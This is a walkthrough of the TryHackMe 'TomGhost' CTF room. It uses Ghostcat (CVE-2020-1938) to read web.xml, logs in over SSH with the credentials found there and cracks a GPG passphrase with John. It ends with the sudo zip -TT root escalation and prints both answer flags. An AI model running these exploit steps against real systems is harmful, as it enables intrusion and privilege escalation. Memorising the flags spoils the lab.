<p style="font-size: 40px; font-weight: bold; ">Tomghost</p>

<br>

# Exploited Vulnerability

The **Ghostcat** vulnerability (CVE-2020-1938) is a critical security flaw found in the **Apache Tomcat** web server, specifically in the **AJP (Apache JServ Protocol)** connector. This vulnerability allows attackers to gain unauthorized access to sensitive files, including web application configuration files, by exploiting the misconfiguration of the AJP connector. If the AJP connector is exposed to the internet without proper restrictions, attackers can send specially crafted requests that could lead to remote code execution or disclosure of confidential information.

In the context of the **TomGhost** CTF challenge on **TryHackMe**, participants are tasked with exploiting this vulnerability to compromise a vulnerable Tomcat instance, capture flags, and escalate privileges within the system. The challenge tests participants' ability to identify and exploit Ghostcat, mimicking real-world penetration testing scenarios.

<br>

<h2 style="font-size: 35px; font-weight: bold;"> Steps </h2>

<br>

# 1 - Nmap:
```
nmap -sV -sC -oN nmap/initial tomghost.thm
```
<br>

<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   # Nmap 7.94SVN scan initiated Wed Feb 26 18:06:35 2025 as: nmap -sV -sC -oN nmap/initial tomghost.thm
   Nmap scan report for tomghost.thm (10.10.103.119)
   Host is up (0.46s latency).
   Not shown: 996 closed tcp ports (reset)
   PORT     STATE SERVICE    VERSION
   22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
   |   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
   |_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
   53/tcp   open  tcpwrapped
   8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
   | ajp-methods: 
   |_  Supported methods: GET HEAD POST OPTIONS
   8080/tcp open  http       Apache Tomcat 9.0.30
   |_http-title: Apache Tomcat/9.0.30
   |_http-favicon: Apache Tomcat
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   # Nmap done at Wed Feb 26 18:06:58 2025 -- 1 IP address (1 host up) scanned in 23.97 seconds
</code></pre>

<br><br>

# 2 - AjpShooter:

**Cloning the repository:**
```
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
```

<br>

**Using the ajpShooter Python script:**
```
python ajpShooter.py http://tomghost.thm:8080/ 8009 /WEB-INF/web.xml read
```
<br>

Result:
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[&lt;] 200 200
[&lt;] Accept-Ranges: bytes
[&lt;] ETag: W/"1261-1583902632000"
[&lt;] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[&lt;] Content-Type: application/xml
[&lt;] Content-Length: 1261

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true"&gt;

  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
  &lt;description&gt;
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  &lt;/description&gt;

&lt;/web-app&gt;
</code></pre>


<br>

**Use skyfuck** skyfuck:8730281lkjlkjdqlksalks

<br><br>

# 3 - Using skyfuck to obtain access to the targe: 

```
ssh skyfuck@tomghost.thm
```

### **username:** `skyfuck`
### **password:** `8730281lkjlkjdqlksalks`

<br>

result:  
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   The authenticity of host 'tomghost.thm (10.10.103.119)' can't be established.
   ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
   This key is not known by any other names.
   Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
   Warning: Permanently added 'tomghost.thm' (ED25519) to the list of known hosts.
   skyfuck@tomghost.thm's password: 
   Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage


   The programs included with the Ubuntu system are free software;
   the exact distribution terms for each program are described in the
   individual files in /usr/share/doc/*/copyright.

   Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
   applicable law.

   skyfuck@ubuntu:~$ 
   skyfuck@ubuntu:~$ ls
   credential.pgp  tryhackme.asc
   skyfuck@ubuntu:~$ 
</code></pre>

<br><br>

# 4 - Using SPC to copy files to the local machine:

```
scp skyfuck@tomghost.thm:/home/skyfuck/* . 
```

**Password:** 8730281lkjlkjdqlksalks

<br>

Successful:
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   credential.pgp                                           100%  394     0.6KB/s   00:00  
   tryhackme.asc                                            100% 5144     7.8KB/s   00:00  
</code></pre>

<br><br>

# 5 - Using John the Ripper to crack the hash file `tryhackme.asc`:
<br>

1. **Install John the Ripper:**
   ```
   sudo apt install john -y
   ```
<br><br>

2. **Extract the hash from a GPG-encrypted file and save it in a .txt file:**
   ```
   gpg2john tryhackme.asc > hashfile.txt
   ```
   <br>

   **The command `gpg2john tryhackme.asc > hashfile.txt` extracts the hash of a GPG-encrypted file (tryhackme.asc) and saves it into a text file (hashfile.txt) for further password cracking with tools like John the Ripper.**


<br><br>

3. **Using John the Ripper to crack the password hash:**
   ```
   john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
   ```
   <br>

   **The command `john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt` uses the John the Ripper tool to crack the password hash stored in `hashfile.txt` by attempting passwords from the `rockyou.txt` wordlist.**

   <br>

    Result:
   <pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
      Using default input encoding: UTF-8
      Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
      Cost 1 (s2k-count) is 65536 for all loaded hashes
      Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
      Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
      Will run 2 OpenMP threads
      Press 'q' or Ctrl-C to abort, almost any other key for status
      alexandru        (tryhackme)     
      1g 0:00:00:00 DONE (2025-02-26 21:59) 12.50g/s 13400p/s 13400c/s 13400C/s chinita..alexandru
      Use the "--show" option to display all of the cracked passwords reliably
      Session completed. 
   </code></pre>
    
   <br>

   **The output shows that the password for the hash in hashfile.txt is `alexandru`**

   <br>

   ### Explanation of the Output:

   This means that **John the Ripper successfully cracked the password** for the hash stored in `hashfile.txt`.

   The output indicates that the user **"tryhackme"** has the password **"alexandru"**, and the associated email is **stuxnet@tryhackme.com**.

   The last line confirms that **1 hash was cracked** and that **there are no more hashes left to process**.


<br><br>


# 6 - GPG Key Import Process:

## Command used:
```
gpg --import tryhackme.asc
```
<br>

Result:
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
   gpg: key 8F3DA3DEC6707170: secret key imported
   gpg: Total number processed: 1
   gpg:               imported: 1
   gpg:       secret keys read: 1
   gpg:   secret keys imported: 1
</code></pre>

<br>

### The following steps were performed to import a GPG key from the file `tryhackme.asc` into the local system:

1. **Key Directory Creation**:
   ```
   gpg: directory '/root/.gnupg' created
   ```
   GPG created a new directory (`/root/.gnupg`) to store the imported keys.

<br>

2. **Keybox Creation**:
   ```
   gpg: keybox '/root/.gnupg/pubring.kbx' created
   ```
   A keybox file was created, which is used to store the public keys.

<br>

3. **Trust Database Creation**:
   ```
   gpg: /root/.gnupg/trustdb.gpg: trustdb created
   ```
   GPG created a trust database to manage key trust levels.

<br>

4. **Key Import**:
   ```
   gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
   ```
   The public key was successfully imported from the `tryhackme.asc` file.

<br>

5. **Secret Key Import**:
   ```
   gpg: key 8F3DA3DEC6707170: secret key imported
   ```
   The corresponding secret key was successfully imported into the local keyring.

<br>

6. **Final Status**:
   ```
   gpg: Total number processed: 2
   gpg: unchanged: 2
   gpg: secret keys read: 1
   gpg: secret keys imported: 1
   ```
   - A total of 2 keys were processed (1 public and 1 secret).
   - Both keys were not changed (likely because they were already present).
   - One secret key was successfully imported.

<br>

With this, the GPG keys are now available for use in the local system, and you can use the secret key to decrypt messages or files that were encrypted with the corresponding public key.


<br><br>

# 7 - GPG Decryption Command:

## Command Used:
```
gpg --decrypt credential.pgp
```
<br>

Result:
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
   gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
         "tryhackme <stuxnet@tryhackme.com>"
   merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
</code></pre>

<br>

### What Happened?

1. **Warning Message:**  
   - The warning `cipher algorithm CAST5 not found in recipient preferences` suggests that the CAST5 encryption algorithm is not preferred by the recipient but was still used.

<br>

2. **Encryption Details:**  
   - The file `credential.pgp` was encrypted using a **1024-bit ELG (ElGamal) key**.
   - The key ID is `61E104A66184FBCC`, created on **March 11, 2020**.
   - The associated email is `tryhackme <stuxnet@tryhackme.com>`.

<br>

3. **Decryption Result:**  
   - The decrypted content of `credential.pgp` was successfully displayed.
   - The output reveals a credential:  
     ```
     merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
     ```
   - This suggests a possible **username (`merlin`)** and **password (`asuyusdoiuqoilkda...`)**.

<br>

The command successfully decrypted the file and revealed its contents. The provided credentials may be useful for authentication in a related system.

<br><br>

# 8 - Log in with the merlin user to capture the flags:

```
ssh merlin@tomghost@tomghost.thm
```
<br>

**Use the password:** `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

**use `ls` command to find the `user.txt` flag**

<br>

### **`user.txt` flag:**
```
THM{GhostCat_1s_so_cr4sy}
```

<br><br>

# 9 - List the user `(merlin)` privileges.:

### Explanation of the Command

The executed command was:

```
sudo -l
```
<br>

### **Terminal:**
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   merlin@ubuntu:/$ sudo -l
   Matching Defaults entries for merlin on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

   User merlin may run the following commands on ubuntu:
      (root : root) NOPASSWD: /usr/bin/zip
</code></pre>

<br>

This command lists the `sudo` privileges for the current user (`merlin`). It shows which commands the user can execute with elevated (root) permissions and whether a password is required.

---

### Analyzing the Output

1. **Defaults Entries**  
   - `env_reset`: Resets the user's environment variables when using `sudo`, ensuring a more secure environment.  
   - `mail_badpass`: Sends an email to the administrator if an incorrect password is entered when using `sudo`.  
   - `secure_path`: Defines the secure directories where `sudo` can find executables.  

<br>

2. **User (`merlin`) Privileges**  
   - The user **can execute the `/usr/bin/zip` command as root**.  
   - **NOPASSWD** means that **no password is required** when executing this command with `sudo`.  

---

### What Does This Mean?

The user `merlin` can run the `zip` command as **root** without needing to enter a password. This could be exploited for privilege escalation, depending on the system configuration.

<br><br>

# 10 - Privilege escalation:

### **Script:**
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
<br>

**This script takes advantage of the ability to run `zip` as root without requiring a password, allowing privilege escalation.**

<br>

### **Terminal:**
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   merlin@ubuntu:/$ TF=$(mktemp -u)
   merlin@ubuntu:/$ sudo zip $TF /etc/hosts -T -TT 'sh #'
   adding: etc/hosts (deflated 31%)
</code></pre>

<br>

### **Step-by-Step Execution**

1. **`TF=$(mktemp -u)`**  
   - Creates a unique temporary filename using `mktemp -u`.  
   - The `-u` option generates a unique name but **does not create the file**.  
   - Example output: `/tmp/tmp.abcdef1234`.  
   - The filename is stored in the `TF` variable.  

2. **`sudo zip $TF /etc/hosts -T -TT 'sh #'`**  
   - **`sudo zip $TF /etc/hosts`**  
     - Runs `zip` with **superuser (`sudo`) privileges**.  
     - Creates a ZIP archive named `$TF` (the previously generated filename).  
     - Adds `/etc/hosts` to the ZIP archive.  

   - **`-T` (test archive integrity)**  
     - Instructs `zip` to test the integrity of the newly created archive.  

   - **`-TT 'sh #'`**  
     - Defines a command to execute **before** testing archive integrity.  
     - The command `'sh #'` launches a shell (`sh`).  
     - Since `zip` is running as `sudo`, the shell will run **with root privileges**.  

3. **`sudo rm $TF`**  
   - Deletes the ZIP archive after execution.  
   - This helps remove traces of the privilege escalation attempt.  

---

### **What Does This Script Achieve?**  
- It **abuses the sudo privilege** given to `zip` to execute a shell (`sh`) as **root**.  
- The `-TT` option allows running arbitrary commands **before integrity testing**.  
- Since `zip` is executed **with root privileges** and does not require a password, the opened shell **inherits root access**.  
- This results in a **privilege escalation attack**, granting full system control.  

### **Conditions for the Attack to Work**  
- The user (`merlin` in this case) must have sudo permissions to run `zip` **without a password**, as seen in the `sudo -l` output.  
- The installed version of `zip` must support the `-TT` flag.  

---

This is a well-known example of **sudo misconfiguration**, leading to a **root privilege escalation** attack.

<br><br>

# 11 - Capture the `root.txt` flag:

**Use `ls` command to find the `root` directory.**

**Use `cd` command to enter the `root` directory.**

**Use `ls` command to find the `root.txt`.**

**Use `cat` command to capture the flag `root.txt`.**

<br>

### **`root.txt` flag:**
```
THM{Z1P_1S_FAKE}
```

<br>

### **Terminal:**
<pre><code style="font-size: 12px; color: rgb(60, 175, 31);">
   # ls
   bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
   # cd root
   # ls
   root.txt  ufw
   # cat root.txt
   THM{Z1P_1S_FAKE}
</code></pre>

<br><br>

<h2 style="font-size: 30px;"> Questions: </h2>

- **Compromise this machine and obtain user.txt.** <p style="font-style: italic; color: rgb(60, 175, 31);"> **THM{GhostCat_1s_so_cr4sy}** <p>

---

- **Escalate privileges and obtain root.txt.** <p style="font-style: italic; color: rgb(60, 175, 31);"> **THM{Z1P_1S_FAKE}** <p>